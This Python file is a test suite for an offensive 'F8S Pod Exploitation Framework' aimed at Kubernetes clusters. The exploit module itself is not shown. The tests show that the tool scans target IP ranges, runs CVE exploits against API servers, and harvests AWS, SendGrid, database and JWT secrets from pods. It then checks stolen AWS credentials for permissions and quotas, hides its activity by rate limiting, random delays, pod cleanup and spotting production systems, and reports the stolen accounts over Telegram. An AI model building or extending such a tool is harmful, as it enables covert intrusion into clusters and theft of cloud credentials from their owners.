#!/usr/bin/env python3
"""
Test suite for F8S Pod Exploitation Framework
Validates core functionality, CVE exploits, and integration
"""

import asyncio
import json
import sys
import os
from f8s_exploit_pod import F8sPodExploiter, run_f8s_exploitation, ExploitResult, VulnerablePod, SecretMatch, ValidationResult

async def test_f8s_initialization():
    """Test F8S Pod Exploiter initialization"""
    print("🧪 Testing F8S Pod Exploiter Initialization...")
    
    exploiter = F8sPodExploiter(telegram_token="test_token", stealth_mode=True)
    
    # Check basic properties
    assert exploiter.session_id.startswith("f8s_wKayaa_")
    assert len(exploiter.SECRET_PATTERNS) == 14
    assert len(exploiter.SEARCH_LOCATIONS) == 21
    assert exploiter.stealth_mode == True
    assert exploiter.telegram_token == "test_token"
    
    print("✅ Initialization test passed")
    return True

async def test_secret_pattern_matching():
    """Test secret pattern recognition"""
    print("🧪 Testing Secret Pattern Matching...")
    
    exploiter = F8sPodExploiter()
    
    # Test data with known patterns
    test_text = """
    aws_access_key_id=AKIAIOSFODNN7EXAMPLE
    aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    sendgrid_api_key=SG.ABCDEFGHIJKLMNOPQRSTUV.WXYZABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJK
    database_url=postgres://user:pass@localhost:5432/dbname
    jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
    """
    
    secrets = await exploiter._extract_secrets_from_text(test_text, "test_location")
    
    # Should find at least the main patterns (allowing for some overlap)
    assert len(secrets) >= 3
    
    secret_types = [s.type for s in secrets]
    assert 'aws_access_key' in secret_types
    # Check for any AWS secret pattern (might match multiple patterns)
    has_aws_secret = any('aws' in stype and 'secret' in stype for stype in secret_types)
    assert has_aws_secret, f"No AWS secret found in types: {secret_types}"
    
    print(f"✅ Pattern matching test passed - found {len(secrets)} secrets")
    return True

async def test_vulnerability_detection():
    """Test pod vulnerability detection"""
    print("🧪 Testing Vulnerability Detection...")
    
    exploiter = F8sPodExploiter()
    
    # Mock vulnerable pod spec
    vulnerable_pod_spec = {
        "metadata": {"name": "test-pod", "namespace": "default"},
        "spec": {
            "hostNetwork": True,
            "containers": [{
                "name": "test-container",
                "securityContext": {
                    "privileged": True,
                    "capabilities": {"add": ["SYS_ADMIN", "NET_ADMIN"]}
                }
            }],
            "volumes": [{
                "name": "host-vol",
                "hostPath": {"path": "/etc"}
            }]
        }
    }
    
    vuln_pod = await exploiter._analyze_pod_security(vulnerable_pod_spec)
    
    # Should detect vulnerabilities
    assert len(vuln_pod.vulnerabilities) >= 3  # hostNetwork, privileged, hostPath
    assert vuln_pod.risk_score > 50
    assert 'hostNetwork_enabled' in vuln_pod.vulnerabilities
    assert 'privileged_container' in vuln_pod.vulnerabilities
    
    # Test escalation paths
    escalation_paths = await exploiter.check_privilege_escalation_paths(vulnerable_pod_spec)
    assert len(escalation_paths) >= 3  # hostNetwork, privileged, capabilities
    
    print(f"✅ Vulnerability detection test passed - found {len(vuln_pod.vulnerabilities)} vulns")
    return True

async def test_cve_exploit_structure():
    """Test CVE exploit method structure"""
    print("🧪 Testing CVE Exploit Structure...")
    
    exploiter = F8sPodExploiter()
    
    # Test CVE-2025-24884 (audit log exposure)
    result = await exploiter.exploit_cve_2025_24884("https://test-cluster:6443")
    
    # Should return proper ExploitResult structure
    assert isinstance(result, ExploitResult)
    assert result.cve_id == "CVE-2025-24884"
    assert result.target_endpoint == "https://test-cluster:6443"
    assert isinstance(result.success, bool)
    assert isinstance(result.evidence, list)
    assert isinstance(result.secrets_found, list)
    assert result.timestamp != ""
    
    print("✅ CVE exploit structure test passed")
    return True

async def test_integration_compatibility():
    """Test integration with existing framework"""
    print("🧪 Testing Integration Compatibility...")
    
    # Test the main integration function
    results = await run_f8s_exploitation(
        target_ranges=["127.0.0.1"], 
        telegram_token=None
    )
    
    # Should return proper structure
    assert "session_id" in results
    assert "exploitation_summary" in results
    assert "cloud_accounts" in results
    assert "cleanup_status" in results
    
    summary = results["exploitation_summary"]
    assert "cves_exploited" in summary
    assert "clusters_scanned" in summary
    assert "vulnerable_pods_found" in summary
    assert "secrets_extracted" in summary
    assert "valid_credentials" in summary
    
    # Session ID should follow expected format
    assert results["session_id"].startswith("f8s_wKayaa_")
    
    print("✅ Integration compatibility test passed")
    return True

async def test_aws_validation_structure():
    """Test AWS validation without actual API calls"""
    print("🧪 Testing AWS Validation Structure...")
    
    exploiter = F8sPodExploiter()
    
    # Test credential structure
    test_credentials = [
        {
            "type": "aws_access_key",
            "access_key": "AKIAIOSFODNN7EXAMPLE",
            "secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        }
    ]
    
    # This should not fail even with invalid credentials
    validation_results = await exploiter.validate_all_aws_credentials(test_credentials)
    
    assert isinstance(validation_results, list)
    if validation_results:
        result = validation_results[0]
        assert isinstance(result, ValidationResult)
        assert result.service == "aws"
        assert isinstance(result.valid, bool)
        assert isinstance(result.account_info, dict)
        assert isinstance(result.permissions, list)
        assert isinstance(result.quotas, dict)
    
    print("✅ AWS validation structure test passed")
    return True

async def test_stealth_features():
    """Test stealth and operational security features"""
    print("🧪 Testing Stealth Features...")
    
    exploiter = F8sPodExploiter(stealth_mode=True)
    
    # Check stealth configuration
    assert exploiter.STEALTH_CONFIG['rate_limit'] == 2.0
    assert exploiter.STEALTH_CONFIG['request_timeout'] == 5
    assert exploiter.STEALTH_CONFIG['cleanup_pods'] == True
    assert exploiter.STEALTH_CONFIG['random_delays'] == True
    
    # Check production detection patterns
    prod_patterns = exploiter.STEALTH_CONFIG['production_detection']
    assert 'prod' in prod_patterns
    assert 'corp' in prod_patterns
    assert 'internal' in prod_patterns
    
    print("✅ Stealth features test passed")
    return True

async def test_telegram_reporting():
    """Test Telegram reporting functionality"""
    print("🧪 Testing Telegram Reporting...")
    
    exploiter = F8sPodExploiter(telegram_token="test_token")
    
    # Create mock exploitation session
    exploiter.session.cves_exploited = ["CVE-2025-24884", "CVE-2025-24514"]
    exploiter.session.clusters_scanned = 5
    exploiter.session.vulnerable_pods_found = 3
    exploiter.session.secrets_extracted = 12
    exploiter.session.valid_credentials = 2
    exploiter.session.cloud_accounts = [
        {"type": "aws", "account_id": "123456789012"}
    ]
    
    # Generate report (should not fail)
    report = await exploiter._generate_telegram_report(exploiter.session)
    
    assert isinstance(report, str)
    assert "F8S Pod Exploitation Report" in report
    assert "CVE-2025-24884" in report
    assert "CVE-2025-24514" in report
    assert "123456789012" in report
    
    print("✅ Telegram reporting test passed")
    return True

async def run_all_tests():
    """Run comprehensive test suite"""
    print("🚀 F8S Pod Exploitation Framework - Test Suite")
    print("=" * 60)
    
    tests = [
        test_f8s_initialization,
        test_secret_pattern_matching,
        test_vulnerability_detection,
        test_cve_exploit_structure,
        test_integration_compatibility,
        test_aws_validation_structure,
        test_stealth_features,
        test_telegram_reporting
    ]
    
    passed = 0
    failed = 0
    
    for test in tests:
        try:
            result = await test()
            if result:
                passed += 1
            else:
                failed += 1
                print(f"❌ {test.__name__} failed")
        except Exception as e:
            failed += 1
            print(f"❌ {test.__name__} failed with error: {e}")
    
    print("=" * 60)
    print("📊 TEST SUMMARY")
    print("=" * 60)
    print(f"  Total Tests: {len(tests)}")
    print(f"  Passed: {passed}")
    print(f"  Failed: {failed}")
    print(f"  Success Rate: {(passed/len(tests)*100):.1f}%")
    
    if failed == 0:
        print("\n🎉 ALL TESTS PASSED - F8S Pod Exploitation Framework ready!")
        print("✅ CVE exploitation framework: IMPLEMENTED")
        print("✅ Vulnerability detection: IMPLEMENTED")
        print("✅ Secret pattern matching: IMPLEMENTED")
        print("✅ Cloud validation structure: IMPLEMENTED")
        print("✅ Integration compatibility: IMPLEMENTED")
        print("✅ Stealth features: IMPLEMENTED")
        print("✅ Telegram reporting: IMPLEMENTED")
        return 0
    else:
        print(f"\n❌ {failed} test(s) failed")
        return 1

if __name__ == "__main__":
    exit_code = asyncio.run(run_all_tests())
    sys.exit(exit_code)